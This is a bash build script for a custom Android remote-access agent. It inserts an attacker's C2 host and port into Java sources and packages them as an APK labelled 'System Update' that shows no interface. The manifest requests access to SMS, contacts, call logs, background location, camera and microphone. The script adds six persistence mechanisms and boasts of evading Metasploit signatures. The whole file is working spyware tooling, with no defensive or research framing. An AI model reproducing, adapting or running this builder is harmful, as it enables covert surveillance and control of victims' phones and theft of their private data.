#!/usr/bin/env bash
# build_agent_pure.sh — Build a pure-custom Android agent APK with ZERO
# msfvenom dependency. No msf signatures, no meterpreter artifacts.
# Just the hardened AgentCore + DlsService + all persistence layers.
#
# Usage: ./build_agent_pure.sh LHOST LPORT [out.apk]
#
# This produces the most stealthy APK possible: only our code, minimal
# resources, signed with debug key (or custom keystore if provided).

set -euo pipefail

LHOST="${1:?usage: build_agent_pure.sh LHOST LPORT [out.apk]}"
LPORT="${2:?usage: ... LHOST LPORT [out.apk]}"
OUT="${3:-androdls-agent.apk}"

ROOT="$(cd "$(dirname "$0")" && pwd)"
SDK="${ANDROID_HOME:-/home/div-admin/Android/Sdk}"
BT="${BUILD_TOOLS:-$SDK/build-tools/35.0.0}"
ANDROID_JAR="$SDK/platforms/android-35/android.jar"
WORK="$ROOT/.payload-build/pure"
AGENT_SRC="$ROOT/agent"
JH="${JAVA_HOME:-/home/div-admin/.local/jdk-17}"

[ -x "$BT/aapt2" ] || { echo "aapt2 missing at $BT"; exit 1; }
[ -x "$BT/d8" ] || { echo "d8 missing at $BT"; exit 1; }
[ -x "$BT/zipalign" ] || { echo "zipalign missing at $BT"; exit 1; }
[ -x "$BT/apksigner" ] || { echo "apksigner missing at $BT"; exit 1; }
[ -f "$ANDROID_JAR" ] || { echo "android.jar missing at $ANDROID_JAR"; exit 1; }

echo "[1/7] Compiling Java sources..."
rm -rf "$WORK"
mkdir -p "$WORK"/{src,classes,res/values,res/xml,lib}

# Copy agent sources
for f in AgentCore.java DlsService.java DlsLauncher.java \
         BootReceiver.java UserPresentReceiver.java PowerReceiver.java \
         WatchdogReceiver.java ResurrectionJob.java; do
    [ -f "$AGENT_SRC/$f" ] || { echo "!! missing: $AGENT_SRC/$f"; exit 1; }
    cp "$AGENT_SRC/$f" "$WORK/src/$f"
done

# Replace C2 placeholders
python3 - "$WORK/src" "$LHOST" "$LPORT" <<'PY'
import sys, os, pathlib
src_dir = pathlib.Path(sys.argv[1])
lhost = sys.argv[2]
lport = sys.argv[3]
for f in src_dir.glob("*.java"):
    t = f.read_text(encoding="utf-8")
    t = t.replace("192.0.2.1", lhost)
    t = t.replace("11111", lport)
    f.write_text(t, encoding="utf-8")
print(f"  C2 -> {lhost}:{lport}")
PY

# Compile
"$JH/bin/javac" -source 8 -target 8 \
    -d "$WORK/classes" \
    -classpath "$ANDROID_JAR" \
    "$WORK/src"/*.java

echo "[2/7] Converting to dex..."
"$BT/d8" --release \
    --min-api 21 \
    --lib "$ANDROID_JAR" \
    --output "$WORK" \
    "$WORK/classes/com/metasploit/stage/"*.class

echo "[3/7] Compiling resources..."
# strings.xml
cat > "$WORK/res/values/strings.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Update</string>
</resources>
EOF

# network_security_config.xml
cat > "$WORK/res/xml/network_security_config.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />
        </trust-anchors>
    </base-config>
</network-security-config>
EOF

# Compile resources with aapt2
"$BT/aapt2" compile -o "$WORK/res.flat" \
    "$WORK/res/values/strings.xml" \
    "$WORK/res/xml/network_security_config.xml" >/dev/null 2>&1

echo "[4/7] Linking APK..."
# AndroidManifest.xml — pure custom, no msf artifacts
cat > "$WORK/AndroidManifest.xml" <<'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.metasploit.stage"
    android:compileSdkVersion="34"
    android:compileSdkVersionCodename="14">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.SEND_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <application
        android:allowBackup="false"
        android:fullBackupContent="false"
        android:hardwareAccelerated="true"
        android:icon="@android:drawable/ic_menu_compass"
        android:label="@string/app_name"
        android:networkSecurityConfig="@xml/network_security_config"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.NoDisplay">

        <!-- Main service: foreground, START_STICKY, starts AgentCore + watchdog -->
        <service
            android:name="com.metasploit.stage.DlsService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="dataSync|specialUse" />

        <!-- Invisible launcher: starts service, no UI -->
        <activity
            android:name="com.metasploit.stage.DlsLauncher"
            android:excludeFromRecents="true"
            android:exported="true"
            android:theme="@android:style/Theme.NoDisplay">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- BootReceiver: BOOT_COMPLETED + QUICKBOOT + REBOOT -->
        <receiver
            android:name="com.metasploit.stage.BootReceiver"
            android:directBootAware="true"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.REBOOT" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>

        <!-- UserPresentReceiver: USER_PRESENT + USER_UNLOCKED -->
        <receiver
            android:name="com.metasploit.stage.UserPresentReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.USER_PRESENT" />
                <action android:name="android.intent.action.USER_UNLOCKED" />
            </intent-filter>
        </receiver>

        <!-- PowerReceiver: POWER_CONNECTED + DISCONNECTED -->
        <receiver
            android:name="com.metasploit.stage.PowerReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
            </intent-filter>
        </receiver>

        <!-- WatchdogReceiver: AlarmManager heartbeat -->
        <receiver
            android:name="com.metasploit.stage.WatchdogReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="com.metasploit.stage.WATCHDOG_FIRE" />
            </intent-filter>
        </receiver>

        <!-- ResurrectionJob: JobScheduler periodic resurrection -->
        <service
            android:name="com.metasploit.stage.ResurrectionJob"
            android:enabled="true"
            android:exported="true"
            android:permission="android.permission.BIND_JOB_SERVICE" />

    </application>
</manifest>
MANIFEST

"$BT/aapt2" link \
    -o "$WORK/linked.apk" \
    --manifest "$WORK/AndroidManifest.xml" \
    -I "$ANDROID_JAR" \
    "$WORK/res.flat" \
    --java "$WORK/src" \
    -v \
    >/dev/null 2>&1

echo "[5/7] Assembling final APK..."
# Extract linked APK, inject our dex
cd "$WORK"
unzip -o linked.apk -d unlinked >/dev/null 2>&1 || true
cd unlinked
# Remove any generated classes (we use our own dex)
rm -f classes.dex 2>/dev/null || true
cp "$WORK/classes.dex" .
# Build the APK
cd "$WORK"
zip -r "$WORK/final_unsigned.apk" -j unlinked/* >/dev/null 2>&1 || {
    # Fallback: manual zip
    cd unlinked
    zip -r "$WORK/final_unsigned.apk" . >/dev/null 2>&1
    cd "$WORK"
}

echo "[6/7] zipalign + sign..."
"$BT/zipalign" -f 4 "$WORK/final_unsigned.apk" "$WORK/aligned.apk"

if [ ! -f "$ROOT/debug.keystore" ]; then
    keytool -genkeypair -keystore "$ROOT/debug.keystore" -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10950 \
        -dname "CN=Android Debug,O=Android,C=US" \
        -storepass android -keypass android >/dev/null 2>&1
fi
"$BT/apksigner" sign --ks "$ROOT/debug.keystore" --ks-pass pass:android \
    --key-pass pass:android --out "$OUT" "$WORK/aligned.apk"

echo "[7/7] Verifying..."
"$BT/apksigner" verify "$OUT"

# Show APK info
APK_SIZE=$(stat -c%s "$OUT")
echo ""
echo "DONE: $OUT (${APK_SIZE} bytes)"
echo "  C2: $LHOST:$LPORT"
echo "  Package: com.metasploit.stage"
echo "  minSdk: 21, targetSdk: 34"
echo "  ZERO msfvenom/msf artifacts — pure custom build"
echo ""
echo "  6-layer persistence:"
echo "    1. BootReceiver (BOOT_COMPLETED + QUICKBOOT + REBOOT)"
echo "    2. UserPresentReceiver (USER_PRESENT + USER_UNLOCKED)"
echo "    3. PowerReceiver (POWER_CONNECTED + DISCONNECTED)"
echo "    4. WatchdogReceiver (AlarmManager, 15-min heartbeat)"
echo "    5. ResurrectionJob (JobScheduler, persisted, 15-min)"
echo "    6. DlsService (START_STICKY + foreground + NetworkCallback)"
echo ""
echo "  Install: adb install -r '$OUT'"
echo "  Launch:  adb shell am start -n com.metasploit.stage/.DlsLauncher"
